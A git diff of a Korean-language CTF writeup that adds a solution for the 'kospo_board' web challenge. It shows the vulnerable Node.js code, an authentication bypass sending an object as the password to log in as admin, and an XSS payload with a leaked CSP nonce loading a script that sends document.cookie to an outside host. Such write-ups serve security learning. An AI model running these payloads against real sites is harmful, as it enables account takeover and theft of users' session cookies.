@@ -8,10 +8,6 @@ tags:
 draft: false
 ---
 
-# KOSPO CTF 2024 Writeup
-
-A writeup for KOSPO CTF 2024.
-
 ## Web
 
 ### look_me_inside (1000 points, 24 solves)
@@ -251,6 +247,170 @@ console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim())
 ```
 
 **flag{SS1t_w1TH_Go14ng!!!}**
+
+
+### kospo_board(1000 points, 5 solves)
+문제 파일을 열었을때, 코드가 너무 난잡해서 나중에 풀었던 문제이다.
+내가 좋아하는 **nodejs**로 작성된 서버이다!!
+일단, **flag**는 봇의 **cookie**에 존재한다. 먼저, **flag**을 얻기 위한 **board**가 어떻게 작동하는 알아보자.
+```javascript
+router.post('/new', (req, res, next) => {
+	let page_uuid = uuid.v4()
+	db.query(
+		'INSERT INTO board (uuid, title, content, username, admin_viewed) VALUES (?, ?, ?, ?, ?)',
+		[page_uuid, req.body.title, req.body.content, req.user.username, false],
+		(error, results, fields) => {
+			if (error) {
+				return next(error)
+			}
+			res.redirect(`./view/${page_uuid}`)
+		}
+	)
+})
+router.get('/view/:uuid', (req, res, next) => {
+	db.query('SELECT * FROM board WHERE uuid = ?', [req.params.uuid], (error, results, fields) => {
+		if (error) {
+			return next(error)
+		}
+		if (!results[0]) {
+			return res.sendStatus(404)
+		}
+		console.log(results)
+		let content_user = results[0].username
+		let content = results[0].content
+		db.query('SELECT * FROM users WHERE username = ?', [content_user], (error, results, fields) => {
+			if (error) {
+				return next(error)
+			}
+			if (!results[0]) {
+				return res.sendStatus(500)
+			}
+			console.log(results)
+			let nonceFlag = results[0].nonce_flag // nonce_flag는 admin 계정만 참이며, 아닌 경우는 모두 false이다.
+			let _nonce = uuid.v4()
+			if (nonceFlag) {
+				db.query(
+					'SELECT nonce FROM nonces WHERE username = ?',
+					[content_user],
+					(error, results, fields) => {
+						if (error) {
+							return next(error)
+						}
+						if (!results[0]) {
+							db.query(
+								'INSERT INTO nonces (username, nonce) VALUES (?, ?)',
+								[content_user, _nonce],
+								(err) => {
+									if (err) {
+										return next(err)
+									}
+								}
+							)
+						} else {
+							_nonce = results[0].nonce
+						}
+						res.send(`
+                        <html>
+                        <head>
+                            <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-${_nonce}'; style-src 'self' 'unsafe-inline'; img-src *;">
+                            <script nonce='${_nonce}'>document.write("hi")</script>
+                            ${content}
+                        </head>
+                        </html>
+                    `)
+					}
+				)
+			} else {
+				res.send(`
+                    <html>
+                    <head>
+                        <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-${_nonce}'; style-src 'self' 'unsafe-inline'; img-src *;">
+                        <script nonce='${_nonce}'>document.write("hi")</script>
+                        ${content}
+                    </head>
+                    </html>
+                `)
+			}
+		})
+	})
+})
+```
+딱 보자마자, **nonce**를 얻어야 한다는 것을 알 수 있다.
+여기서 **nonce**를 얻는 방법이 두가지가 있다.
+1. **css injection**을 통한 **nonce** leak (csp를 보면 이게 인텐인 것 같기도 하다.)
+2. 계정 로그인 관련 취약점을 통한 **nonce** leak
+난 2번 방법을 사용해 **nonce**를 얻었다.
+**auth** 관련 코드를 보면, id와 pw의 타입 검증 없이 그대로 바인딩하고 있는 것을 알 수 있다.
+이는, 유사 **sql injection**이 가능해진다.[^1]
+```javascript
+passport.use(
+	new Strategy(function (req, cb) {
+		let username = req.body.username
+		let password = req.body.password
+		console.log(username, password)
+		db.query(
+			'SELECT * FROM users WHERE username = ? AND password = ?',
+			[username, password],
+			function (err, row, fields) {
+				if (err) {
+					return cb(err)
+				}
+				if (!row[0]) {
+					return cb(null, false, { message: 'Incorrect username or password.' })
+				}
+				console.log(row)
+				var user = {
+					id: row[0].id,
+					username: row[0].username,
+					nonceFlag: row[0].nonce_flag
+				}
+				return cb(null, user)
+			}
+		)
+	})
+)
+```
+**username**에는 **admin**을 넣고, **password**는 객체로 전달해주면 된다.
+```typescript
+import { create } from './utils/'
+const r = create({
+	baseURL: 'http://hackbox.kospo.co.kr:41324/'
+})
+await r
+	.post(
+		'/login',
+		{
+			username: 'admin',
+			password: {
+				username: 0
+			}
+		},
+		{
+			maxRedirects: 0,
+			validateStatus: (status) => status === 302
+		}
+	)
+	.then((res) => console.info(res.headers, res.status))
+```
+그러면, **admin** 계정을 탈취할 수 있고, **nonce**를 얻을 수 있다.
+참고로, **nonce** 값은 **cf833634-6991-47b9-8f85-9ba91c8a1a44**이다.
+이제, **xss**를 통해 **flag**을 얻어야 한다.
+먼저 **script**를 제공해줄 서버를 준비해야 한다.
+```typescript
+import express from 'express'
+const app = express()
+app.use('*', (req, res) => {
+	console.info(req.query)
+	console.info(req.headers)
+	res.status(200).send('location.href="https://h.bmcyver.dev/?"+document.cookie')
+})
+app.listen(3000, '0.0.0.0', () => {
+	console.log('Server started on http://0.0.0.0:3000')
+})
+```
+그리고, `<script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'></script>`를 `content`에 넣고 `post`하면 된다.
+![img2](img2.png)
+`flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}`
 
 ## Misc
 
